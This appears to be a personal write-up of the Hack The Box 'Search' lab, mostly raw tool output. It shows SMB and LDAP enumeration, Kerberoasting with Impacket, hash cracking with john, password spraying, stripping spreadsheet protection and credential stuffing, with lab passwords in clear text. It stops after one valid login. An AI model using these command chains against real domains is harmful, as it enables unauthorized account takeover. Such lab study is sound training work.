do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================= 
|    Users on 10.10.11.129    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[V] Attempting to get userlist with command: rpcclient -W '' -c querydispinfo -U''%'' '10.10.11.129' 2>&1
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[V] Attempting to get userlist with command: rpcclient -W '' -c enumdomusers -U''%'' '10.10.11.129' 2>&1
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ========================================= 
|    Share Enumeration on 10.10.11.129    |
 ========================================= 
[V] Attempting to get share list using authentication
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
do_connect: Connection to 10.10.11.129 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.11.129

 ==================================================== 
|    Password Policy Information for 10.10.11.129    |
 ==================================================== 
[V] Attempting to get Password Policy info with command: polenum '':''@'10.10.11.129' 2>&1
[E] Unexpected error from polenum:


[+] Attaching to 10.10.11.129 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.11.129)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
[V] Attempting to get Password Policy info with command: rpcclient -W '' -U''%'' '10.10.11.129' -c "getdompwinfo" 2>&1

[E] Failed to get password policy with rpcclient


 ============================== 
|    Groups on 10.10.11.129    |
 ============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
[V] Getting builtin groups with command: rpcclient -W '' -U''%'' '10.10.11.129' -c 'enumalsgroups builtin' 2>&1

[+] Getting builtin groups:

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
[V] Getting local groups with command: rpcclient -W '' -U''%'' '10.10.11.129' -c 'enumalsgroups domain' 2>&1

[+] Getting local groups:

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.
[V] Getting domain groups with command: rpcclient -W '' -U''%'' '10.10.11.129' -c "enumdomgroups" 2>&1

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on 10.10.11.129 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[V] Attempting to get SID from 10.10.11.129 with command: rpcclient -W '' -U''%'' '10.10.11.129' -c 'lookupnames administrator' 2>&1
[V] Assuming that user "administrator" exists
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.
[V] Attempting to get SIDs from 10.10.11.129 with command: rpcclient -W '' -U''%'' '10.10.11.129' -c lsaenumsid 2>&1

 ============================================= 
|    Getting printer info for 10.10.11.129    |
 ============================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
[V] Attempting to get printer info with command: rpcclient -W '' -U''%'' -c 'enumprinters' '10.10.11.129' 2>&1
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Fri Apr 14 05:46:48 2023



nikto:
nikto -h 10.10.11.129
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.129
+ Target Hostname:    10.10.11.129
+ Target Port:        80
+ Start Time:         2023-04-14 05:46:40 (GMT-4)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 4.0.30319
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ 8041 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2023-04-14 06:02:23 (GMT-4) (943 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested



smbmap -H 10.10.11.129         
[+] IP: 10.10.11.129:445        Name: 10.10.11.129


smbclient -N -L ///10.10.11.129
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.129 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available


visiting the site on port 80, we find interesing info in one of the photos:

It says “Send password to Hope Sharp” and on the next line, “IsolationIsKey?”. That’s likely a user’s name and maybe a password.



gobuster dir  -u http://10.10.11.129  -w /usr/share/wordlists/dirb/common.txt -t 64                             
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.11.129
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/04/14 08:37:11 Starting gobuster
===============================================================
/certenroll (Status: 301)
/certsrv (Status: 401)
/css (Status: 301)
/fonts (Status: 301)
/Images (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
/staff (Status: 403)
===============================================================
2023/04/14 08:37:15 Finished
===============================================================


/certsrv and /certenroll show that this server is part of a Certificate Authority.

Visiting /certsrv asks for authentication, and /certenroll just returns 403.


we cannot enumerate smb without a user

I created a user file, taking the user from the image found on the website and making some modifications in order to see, if I can use crackmapexec in order to get a username an pass combination

crackmapexec smb 10.10.11.129 -u hope.txt  -p IsolationIsKey? --continue-on-success
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\hope:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\sharp:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\h.sharp:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\hope.s:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\hopesharp:IsolationIsKey? STATUS_LOGON_FAILURE 


now we can use smblcient to see what is on the share:

smbmap -H 10.10.11.129 -u hope.sharp -p IsolationIsKey?                                                                                                                                      1 ⨯
[+] IP: 10.10.11.129:445        Name: search.thb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        CertEnroll                                              READ ONLY       Active Directory Certificate Services share
        helpdesk                                                NO ACCESS
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        RedirectedFolders$                                      READ, WRITE
        SYSVOL                                                  READ ONLY       Logon server share 


The CertEnroll share has some .crl files and other certificate related stuff that isn’t useful.

I am able to connect to helpdesk, but not list anything in it.

NETLOGON is empty.

RedirectedFolders$ has a bunch of users:


smbclient //10.10.11.129/RedirectedFolders$ -U hope.sharp                                                                                                                                    1 ⨯
Password for [WORKGROUP\hope.sharp]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  Dc        0  Fri Apr 14 08:42:45 2023
  ..                                 Dc        0  Fri Apr 14 08:42:45 2023
  abril.suarez                       Dc        0  Tue Apr  7 14:12:58 2020
  Angie.Duffy                        Dc        0  Fri Jul 31 09:11:32 2020
  Antony.Russo                       Dc        0  Fri Jul 31 08:35:32 2020
  belen.compton                      Dc        0  Tue Apr  7 14:32:31 2020
  Cameron.Melendez                   Dc        0  Fri Jul 31 08:37:36 2020
  chanel.bell                        Dc        0  Tue Apr  7 14:15:09 2020
  Claudia.Pugh                       Dc        0  Fri Jul 31 09:09:08 2020
  Cortez.Hickman                     Dc        0  Fri Jul 31 08:02:04 2020
  dax.santiago                       Dc        0  Tue Apr  7 14:20:08 2020
  Eddie.Stevens                      Dc        0  Fri Jul 31 07:55:34 2020
  edgar.jacobs                       Dc        0  Thu Apr  9 16:04:11 2020
  Edith.Walls                        Dc        0  Fri Jul 31 08:39:50 2020
  eve.galvan                         Dc        0  Tue Apr  7 14:23:13 2020
  frederick.cuevas                   Dc        0  Tue Apr  7 14:29:22 2020
  hope.sharp                         Dc        0  Thu Apr  9 10:34:41 2020
  jayla.roberts                      Dc        0  Tue Apr  7 14:07:00 2020
  Jordan.Gregory                     Dc        0  Fri Jul 31 09:01:06 2020
  payton.harmon                      Dc        0  Thu Apr  9 16:11:39 2020
  Reginald.Morton                    Dc        0  Fri Jul 31 07:44:32 2020
  santino.benjamin                   Dc        0  Tue Apr  7 14:10:25 2020
  Savanah.Velazquez                  Dc        0  Fri Jul 31 08:21:42 2020
  sierra.frye                        Dc        0  Wed Nov 17 20:01:46 2021
  trace.ryan                         Dc        0  Thu Apr  9 16:14:26 2020


  We can use this infomation later, now let's enumerate LDAP:

  ldapsearch -h 10.10.11.129 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=search,DC=htb
namingcontexts: CN=Configuration,DC=search,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=search,DC=htb
namingcontexts: DC=DomainDnsZones,DC=search,DC=htb
namingcontexts: DC=ForestDnsZones,DC=search,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1


ldapsearch -h 10.10.11.129 -x -b "DC=search,DC=htb" 
# extended LDIF
#
# LDAPv3
# base <DC=search,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1


now let's do an authenticated ldap search:

# extended LDIF
#
# LDAPv3
# base <DC=search,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search.htb
dn: DC=search,DC=htb
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=search,DC=htb
instanceType: 5
whenCreated: 20200331141828.0Z
whenChanged: 20211117005436.0Z
subRefs: DC=ForestDnsZones,DC=search,DC=htb
subRefs: DC=DomainDnsZones,DC=search,DC=htb
subRefs: CN=Configuration,DC=search,DC=htb
...[snip]...



Kerberoasting:

As Bloodhound identified Kerberoastable users, I’ll go ahead and Kerberoast. I’ll need the creds for hope.sharp, and I’ll use the GetUserSPNs.py script from Impacket. It return a hash for the web_svc account:


python3 GetUserSPNs.py -request -dc-ip 10.10.11.129 search.htb/hope.sharp:IsolationIsKey?                                                                                                    1 ⨯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
---------------------------------  -------  --------  --------------------------  ---------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 08:59:11.329031  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$126d59c30db61a550cd1b6538bedbe2d$71b967bab9bc1427d5b29e5590fe342102046ffc98f4f369fe173a89f8c530cecad4e5d6807be657006465b13b09b0674d489421b1892ccdfab6ee2677dc52a7d18cd0d434e02d3757e37522eb427b75ccbd26c040f0d2b1ba6456c7e1bcc53c91b9a76765c52982e969259ec327db6a3855c5216e0292ff0321f5cf56303eac87fbc5e4787aec006b4c2de2d001a08356316865bf2c41c153456f0899f7912f1f33b9e4ecd7e8e4c50abd3564b11831e4a00e2d15056ced1d065276c54c4da61f9cba560c9af0bb1ef9623860e15ae55fd55726cf72908bec50bc06a4cb423e18e51b9625507c25b1c917c43b477a0ef55185a721f52c71efc7ba697999e7d575d5baa09635909cb61f23ea16311eb851ec758c64fcea3b82a4f5bc88f3280ddccf32f6aa823d55c8ef8810563f6e43bc78b5253eeaabbe3f0298d5d1ac4863f9a8102350666eb1306e9bf563a77505b38616fc2036c0258e091d37ae7ba420d6deb9b39a523a52d4a39a9059ba8fa69a69edd05b6db9606c2dc481349ce4f08364da352f475f959a6e4108d34aee70b668f27a9bd7d23b58a60881b95c5a1e9aadc32c8d9fb8eb341e620c86aeb9d13b533d6ccbb013235138d8f72330d9c09071f5b323bf7240acb05449432357df700269fff57172abf4f95af8c9ecc37c1971ac39abc91544184740c61a84e133e65a8bd5f51afb242258ac109b65ca103e953f0f38352e26837f2be14d03278aa734c0290fa1db268e29cef04fb5c9bfff5d940e97547c96c5a06fc3c6cd541b876d1dc3cabb01c679ebc35dc023c0f3c973d11b84b608c936d26299c5dca827ab894802f687b570b94eb92071e360bcb5e36c19fddb9a69a15d7728ef72c8962be1cff8e227f02d20d7d98a3f4e9fff7141af78577db7d88fba0f561f8881616f60eca7aec48a9701fdfe451b5461c98d69cdba48577b40b5964510b08461893a7219e4fbdd5a634ff7baa7df27fdb1496822448da56172d2c49fe1582493fa1876f6024f4823e323f060e66019d098ad87821e78fa9fdff50b00294b5f8b07f8bb4f104453ea19b8bc72a8aa717a07ed856e6c6faf007553b2b2089ce72c0fef58e53808fb485e1fb65dc0d79270d84c3f6c133985a3c5d2056040514aaf709c0db4a6fd41c9b4ce7c908cadb6eddc41279542f96f98930e122f1000ccb68b1c35df0889eeacc606107537ca40bd02bf31fd600608ee3186ba65562f13d6e95b228926bad627bac869e15eb5229f236ea5f8b48e8d1cf5d42c7c67f6a7246ff227cfcc301f0cb941731842e1cd11ad148fcb598923e007a246df4bd0ff905984706463251450c2b5e67d54070aa00dc95177bfb402b8c8b0d49bf5d0b0abd978acb2d730dee619431f128747908880537582d206c6cefede95dfe79ee074096a603bfef7e5922f43463bfb06dffae915f38bdb0968a3467aa085e3dbb8c16cd3a77c961a


john --wordlist=/usr/share/wordlists/rockyou.txt web_svc.hash                                                                               
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
@3ONEmillionbaby (?)     
1g 0:00:00:04 DONE (2023-04-14 09:08) 0.2386g/s 2742Kp/s 2742Kc/s 2742KC/s @421eduymayte619..?confused?
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


 crackmapexec smb 10.10.11.129 -u web_svc  -p '@3ONEmillionbaby'
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\web_svc:@3ONEmillionbaby 

Password spray:


during ldapenumeration we found some users. we could try to see if the password that we found is used by other accounts

crackmapexec smb 10.10.11.129 -u users.txt  -p passwd.txt --continue-on-success
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\abril.suarez:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\abril.suarez:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Angie.Duffy:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Angie.Duffy:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Antony.Russo:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Antony.Russo:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\belen.compton:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\belen.compton:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cameron.Melendez:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cameron.Melendez:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\chanel.bell:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\chanel.bell:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Claudia.Pugh:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Claudia.Pugh:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cortez.Hickman:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cortez.Hickman:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\dax.santiago:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\dax.santiago:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Eddie.Stevens:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Eddie.Stevens:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\edgar.jacobs:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\edgar.jacobs:@3ONEmillionbaby 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Edith.Walls:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Edith.Walls:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\eve.galvan:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\eve.galvan:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\frederick.cuevas:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\frederick.cuevas:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\hope.sharp:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\jayla.roberts:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\jayla.roberts:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Jordan.Gregory:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Jordan.Gregory:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\payton.harmon:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\payton.harmon:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Reginald.Morton:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Reginald.Morton:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\santino.benjamin:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\santino.benjamin:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Savanah.Velazquez:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Savanah.Velazquez:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\sierra.frye:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\sierra.frye:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\trace.ryan:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\trace.ryan:@3ONEmillionbaby STATUS_LOGON_FAILURE 


smbmap shows similar access to hope.sharp, but now I can access helpdesk:

smbmap -u edgar.jacobs -p '@3ONEmillionbaby' -H 10.10.11.129                                                                                                                                 2 ⨯
[+] IP: 10.10.11.129:445        Name: search.thb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        CertEnroll                                              READ ONLY       Active Directory Certificate Services share
        helpdesk                                                READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        RedirectedFolders$                                      READ, WRITE
        SYSVOL                                                  READ ONLY       Logon server share 


        Helpdesk folder is empty:

        smbclient -U edgar.jacobs //10.10.11.129/helpdesk
Password for [WORKGROUP\edgar.jacobs]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  Dc        0  Tue Apr 14 06:24:23 2020
  ..                                 Dc        0  Tue Apr 14 06:24:23 2020

            


  smb: \edgar.jacobs\Desktop\> get Phishing_Attempt.xlsx 
getting file \edgar.jacobs\Desktop\Phishing_Attempt.xlsx of size 23130 as Phishing_Attempt.xlsx (99.1 KiloBytes/sec) (average 99.1 KiloBytes/sec)
smb: \edgar.jacobs\Desktop\> 


we get the file and we can open it using libre calc. there are 2 sheets ,but one is password protected

We find an interesting article which explains how to remove an Excel spreadsheet password. Following the
process detailed in the article, we unzip the file, remove the <sheetProtection> section and then update
the archive:

unzip Phishing_Attempt.xlsx 
Archive:  Phishing_Attempt.xlsx
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: xl/workbook.xml         
  inflating: xl/_rels/workbook.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/worksheets/sheet2.xml  
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/sharedStrings.xml    
  inflating: xl/drawings/drawing1.xml  
  inflating: xl/charts/chart1.xml    
  inflating: xl/charts/style1.xml    
  inflating: xl/charts/colors1.xml   
  inflating: xl/worksheets/_rels/sheet1.xml.rels  
  inflating: xl/worksheets/_rels/sheet2.xml.rels  
  inflating: xl/drawings/_rels/drawing1.xml.rels  
  inflating: xl/charts/_rels/chart1.xml.rels  
  inflating: xl/printerSettings/printerSettings1.bin  
  inflating: xl/printerSettings/printerSettings2.bin  
  inflating: xl/calcChain.xml        
  inflating: docProps/core.xml       
  inflating: docProps/app.xml        
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Search]
└─$ sed -i 's/<sheetProtection[^>]*>//' xl/worksheets/sheet2.xml
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Search]
└─$ zip -fr Phishing_Attempt.xlsx *
freshening: xl/worksheets/sheet2.xml (deflated 73%)


now just open the document and there is no password protection:


we can now read a list of usernames and passwds:

Payton.Harmon
Cortez.Hickman
Bobby.Wolf
Margaret.Robinson
Scarlett.Parks
Eliezer.Jordan
Hunter.Kirby
Sierra.Frye
Annabelle.Wells
Eve.Galvan
Jeramiah.Fritz
Abby.Gonzalez
Joy.Costa
Vincent.Sutton



;;36!cried!INDIA!year!50;;
..10-time-TALK-proud-66..
??47^before^WORLD^surprise^91??
//51+mountain+DEAR+noise+83//
++47|building|WARSAW|gave|60++
!!05_goes_SEVEN_offer_83!!
~~27%when%VILLAGE%full%00~~
$$49=wide=STRAIGHT=jordan=28$$18
==95~pass~QUIET~austria~77==
//61!banker!FANCY!measure!25//
??40:student:MAYOR:been:66??
&&75:major:RADIO:state:93&&
**30*venus*BALL*office*42**
**24&moment&BRAZIL&members&66**

with these lists, we can use crackmapexec to get valid credentials:


crackmapexec smb 10.10.11.129 -u xlsx_users.txt  -p xlsx_passwd.txt --no-bruteforce --continue-on-success
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Payton.Harmon:;;36!cried!INDIA!year!50;; STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cortez.Hickman:..10-time-TALK-proud-66.. STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Bobby.Wolf:??47^before^WORLD^surprise^91?? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Margaret.Robinson://51+mountain+DEAR+noise+83// STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Scarlett.Parks:++47|building|WARSAW|gave|60++ STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Eliezer.Jordan:!!05_goes_SEVEN_offer_83!! STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Hunter.Kirby:~~27%when%VILLAGE%full%00~~ STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Annabelle.Wells:==95~pass~QUIET~austria~77== STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Eve.Galvan://61!banker!FANCY!measure!25// STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Jeramiah.Fritz:??40:student:MAYOR:been:66?? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Abby.Gonzalez:&&75:major:RADIO:state:93&& STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Joy.Costa:**30*venus*BALL*office*42** STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Vincent.Sutton:**24&moment&BRAZIL&members&66** STATUS_LOGON_FAILURE 




